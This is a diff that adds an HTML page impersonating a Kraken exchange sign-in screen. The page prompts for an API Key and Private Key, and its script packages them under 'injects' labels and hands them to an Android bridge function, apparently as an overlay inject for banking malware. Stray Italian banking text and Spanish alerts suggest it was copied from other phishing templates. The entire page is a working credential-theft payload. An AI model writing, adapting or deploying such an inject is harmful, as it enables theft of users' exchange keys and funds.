@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>kraken</title>
+    <link rel="shortcut icon" href="com.kraken.trade.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #000;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+text-align: center;
+    background-size: 100%;
+    padding: 0px 0px 0px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 0px 0px 0px 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #e1e0e0;
+    text-align: left;
+    outline: none;
+    background: #2a2929;
+    border: 1px solid #000;
+    border-radius: 10px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #ffffff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #6d58c2;
+    border-radius: 10px;
+}
+input::placeholder {
+    color: #e1e0e0;
+    font-size: 15px;
+}
+input:disabled {
+    left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #2a2929;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #5d5d5d;
+    border-radius: 10px;
+}
+</style>
+
+<fieldset id="formtosend">
+
+<div class="logo">
+<img src="data:image/png;base64,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" style="width: 100px; padding: 20px;">
+</div>
+
+<div style="color: #fff;">
+    <span style="display: block;padding-bottom: 20px;font-size: 17px;">Sign in</span>
+    <span style="display: block; padding-bottom: 0px;"><span style="color: #6455a1;font-size: 15px;">Create a Kraken account</span>, <span style="font-size: 15px;">then navigate to <span style="color: #6455a1;">Settings -> API</span> to create API Key</span></span>
+</div>
+
+<div class="" id="log" style="display: block;">
+
+<span style="float: left; padding: 15px; font-size: 14px;">Digita il Codice Adesione e il PIN di Banca Multicanale e vai "Avanti"</span>
+
+  <script>
+function check() {
+  var inp1 = document.getElementById('login'),
+      inp2 = document.getElementById('password');
+  document.getElementById('send').disabled = inp1.value && inp2.value ? false : "disabled";
+}
+</script>
+
+<div class="area" style="padding: 0px;border-radius: 10px;margin: 0px 20px 0px 20px;height: 180px;">
+        <input type="text" onkeyup="check();" name="login" id="login" placeholder="API Key" style="height: 50px;">
+        <input type="password" onkeyup="check();" name="password" id="password" placeholder="Private Key" style="height: 50px;">
+
+        <input type="button" name="sumbit" id="send" value="Confirm" onclick="send_form()" disabled="disabled">
+
+<span style="color: #e3e3e3;font-size: 15px;display: inline-block;padding-top: 30px;">OR</span>
+
+<input type="button" name="sumbit" style="background: #6d58c2; color: #000; font-weight: 600;" value="Scan QR Code">
+
+        <input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+function send_form()
+{
+            if (document.getElementById("login").value == '')
+{
+    alert ('¡Todos los campos requeridos!');
+    return false;
+}
+            if (document.getElementById("password").value == '')
+{
+    alert ('¡Todos los campos requeridos!');
+    return false;
+}
+var data = {};
+    data.login = document.getElementById('login').value;
+    data.password = document.getElementById('password').value;
+    data.type_injects = "crypt";
+    data.closed = "close_activity_injects";
+
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
